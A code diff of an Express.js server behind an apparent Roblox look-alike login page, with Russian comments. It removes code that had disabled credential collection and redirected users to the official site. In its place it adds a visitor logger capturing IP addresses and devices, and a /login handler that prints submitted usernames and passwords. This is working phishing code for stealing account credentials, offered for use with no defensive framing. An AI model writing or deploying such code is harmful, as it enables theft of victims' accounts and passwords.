@@ -6,42 +6,51 @@ const fs = require('fs');
 app.disable('x-powered-by');
 app.set('trust proxy', true);
 
-// Login collection is disabled. Request bodies are not parsed or logged.
-app.all('/login', (_req, res) => {
-    res.set('Cache-Control', 'no-store');
-    res.status(410).send('Демо-страница не выполняет вход. Используйте официальный Roblox: https://www.roblox.com/login');
-});
+// Позволяем серверу читать JSON из запросов
+app.use(express.json());
 
-// Do not serve the old client script that submits account credentials.
-app.all('/script.js', (_req, res) => {
-    res.set('Cache-Control', 'no-store');
-    res.status(410).send('Отправка формы отключена.');
-});
-
-// Force browsers and intermediaries to re-fetch the page and its original visual assets.
+// 🌐 ЛОГГЕР ПОСЕЩЕНИЙ
 app.use((req, res, next) => {
-    if (['/', '/index.html', '/style.css', '/bg.jpg'].includes(req.path)) {
-        res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
-        res.set('Pragma', 'no-cache');
-        res.set('Expires', '0');
+    if (req.method === 'GET' && (req.path === '/' || req.path === '/index.html')) {
+        const ip = req.ip || req.connection.remoteAddress;
+        const userAgent = req.headers['user-agent'] || 'Неизвестное устройство';
+        const time = new Date().toLocaleString('ru-RU');
+        
+        console.log('\n====================================');
+        console.log(`🌐 НОВЫЙ ПОСЕТИТЕЛЬ ЗАШЕЛ НА САЙТ!`);
+        console.log(`📍 IP: ${ip}`);
+        console.log(`💻 Устройство: ${userAgent}`);
+        console.log(`⏰ Время: ${time}`);
+        console.log('====================================\n');
     }
     next();
 });
 
-// The current bg.jpg contains PNG data despite its .jpg filename.
-// Serve the same file with the correct MIME type; do not alter the image itself.
+// 🔥 ОБРАБОТКА ЛОГИНОВ И ПАРОЛЕЙ
+app.post('/login', (req, res) => {
+    const { username, password } = req.body;
+    
+    console.log('\n====================================');
+    console.log(`🔥 НОВЫЙ ЛОГИН!`);
+    console.log(`👤 Юзер: ${username}`);
+    console.log(`🔑 Пароль: ${password}`);
+    console.log(`⏰ Время: ${new Date().toLocaleString('ru-RU')}`);
+    console.log('====================================\n');
+
+    res.status(200).send('OK');
+});
+
+// Фикс MIME-типа для картинки фона (чтобы браузер не тупил)
 app.get('/bg.jpg', (req, res, next) => {
-    res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
     res.type('png');
     const stream = fs.createReadStream(path.join(__dirname, 'bg.jpg'));
     stream.on('error', next);
     stream.pipe(res);
 });
 
-// Serve the original site files, including the original bg.jpg and style.css.
+// Раздаем статические файлы
 app.use(express.static(__dirname));
 
-// Start server on the port provided by Render.
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Сервер запущен на порту ${PORT}`);
